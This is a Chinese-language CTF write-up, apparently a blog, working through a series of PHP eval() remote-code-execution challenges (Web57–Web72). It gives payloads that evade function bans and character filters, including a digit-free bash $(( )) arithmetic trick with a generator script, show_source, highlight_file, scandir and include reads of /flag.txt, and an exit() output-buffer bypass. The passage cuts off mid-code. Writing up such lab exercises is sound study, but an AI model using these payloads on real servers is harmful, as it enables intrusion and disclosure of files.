<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjcwNjM0MDc/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJENjgxNDdERS1BRUIzLTRCMUUtQjEyRC03NjE5RTREQzEzNTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUQ2ODE0N0RFLUFFQjMtNEIxRS1CMTJELTc2MTlFNERDMTM1MSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTI3MDYzNDA3LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09bGludXglRTUlOEYlOTYlRTUlOEYlOEQlRTUlOTElQkQlRTQlQkIlQTRyY2UlRTglODQlOUElRTYlOUMlQUMmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">无数字字母 rce 总结（取反、异或、自增、临时文件）</span></p>
<p>​		可惜，做题的这个考点似乎这两篇文章里没有：</p>
<blockquote>
<p>双小括号 (()) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在 ((和)) 之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号，分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( )) 命令的执行结果。 可以使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>获取</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>命令的结果，这和使用</mtext></mrow><annotation encoding="application/x-tex">获取 (( )) 命令的结果，这和使用</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">命</span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span></span></span></span>获得变量值是类似的。 可以在 (()) 前面加上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>符号获取</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>命令的执行结果，也即获取整个表达式的值。以</mtext><mi>c</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">号</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">命</span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">达</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">以</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加 $ 就不能取得表达式的结果。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #返回上一次的执行结果`</span><br><span class="line">echo $(()) #0</span><br><span class="line">echo $((~$(()))) #~0是-1</span><br><span class="line">$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2</span><br><span class="line">echo $((~-37)) #~-37是36</span><br></pre></td></tr></table></figure>
<p>​		所以 payload：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">$</span>((~<span class="built_in">$</span>((<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))))))</span><br></pre></td></tr></table></figure>
<p>​		可以用这个脚本生成简单的数字：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num_1 = <span class="string">&quot;$((~$(())))&quot;</span></span><br><span class="line">inta = <span class="number">36</span></span><br><span class="line">resp = <span class="string">&quot;$((~$((&quot;</span>+ num_1 * <span class="number">37</span>  +<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure>
<h1 id="web58"><a class="markdownIt-Anchor" href="#web58">#</a> Web58：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		乍一看，好像很简单，不过，当我 post 了一个 phpinfo 之后，发现了函数被禁了：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: phpinfo() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure>
<p>​		建议直接 fuzz 一下，看看具体哪些被 ban 了，这里就直接 show_source 了：</p>
<blockquote>
<p>c=show_source(‘flag.php’);<br>
c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
</blockquote>
<h1 id="web59"><a class="markdownIt-Anchor" href="#web59">#</a> Web59：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		具体不知道有些啥被 ban 了，只能一个个测，结果和上一题一样，show_source 依旧过了：</p>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web60"><a class="markdownIt-Anchor" href="#web60">#</a> Web60：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		一模一样，直接给 paylaod：</p>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web61"><a class="markdownIt-Anchor" href="#web61">#</a> Web61：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		show_source 百试不爽啊。</p>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web62"><a class="markdownIt-Anchor" href="#web62">#</a> Web62：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web63"><a class="markdownIt-Anchor" href="#web63">#</a> Web63：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web64"><a class="markdownIt-Anchor" href="#web64">#</a> Web64：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web65"><a class="markdownIt-Anchor" href="#web65">#</a> Web65：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<p>c=show_source(“flag.php”);</p>
</blockquote>
<h1 id="web66"><a class="markdownIt-Anchor" href="#web66">#</a> Web66：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		show_source 函数被 ban 了，highlight_file 没有被 ban，试试看，结果 flag 没有在 flag.php 里，通过如下 payload 发现 flag 在根目录下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var ) </span></span><br></pre></td></tr></table></figure>
<p>​		那就用 highlight_file 去读根目录：</p>
<h1 id="web67"><a class="markdownIt-Anchor" href="#web67">#</a> Web67：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		print_r 被过滤了，试试看 var_dump，没有被过滤，继续 scandir 去读目录结构。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="web68"><a class="markdownIt-Anchor" href="#web68">#</a> Web68：</h1>
<p>​		由于 highlight_file () 被 ban 了，读不到源码，所以就直接开打了，先测一下 var_dump，var_dump 和 scandir 都没有被 ban，直接读根目录，找到了 flag.txt：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#array(21) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; &#125; </span></span><br></pre></td></tr></table></figure>
<p>​		之后就是其他手法了，根据 txt 文件，推测 flag 应该不会被当作 php 代码执行，所以试着使用文件包含等手法读 flag：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="web69"><a class="markdownIt-Anchor" href="#web69">#</a> Web69：</h1>
<p>​		ban 了 highlight_file、var_dump，那就用 var_export，输出目录结构：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure>
<p>​		之后 include 包含 /flag.txt 文件即可得到 flag。</p>
<h1 id="web70"><a class="markdownIt-Anchor" href="#web70">#</a> Web70：</h1>
<p>​		通过 var_export 读取文件目录结构，再用 include 包含 /flag.txt，和上面几个题没有任何区别。</p>
<h1 id="web71"><a class="markdownIt-Anchor" href="#web71">#</a> Web71：</h1>
<p>​		附件里给了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		有几个点需要注意：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();<span class="comment">//得到缓冲区的数据。</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();<span class="comment">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span></span><br></pre></td></tr></table></figure>
<p>​		也就是说，这里需要在执行上面两个函数之前，把程序输出出来就行了，这个时候，就可以选择提前结束掉整个程序，因为缓冲区就是在程序结束之前需要将里面的所有内容全部输出才行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure>
<p>​		之后就</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<h1 id="web72"><a class="markdownIt-Anchor" href="#web72">#</a> Web72：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span 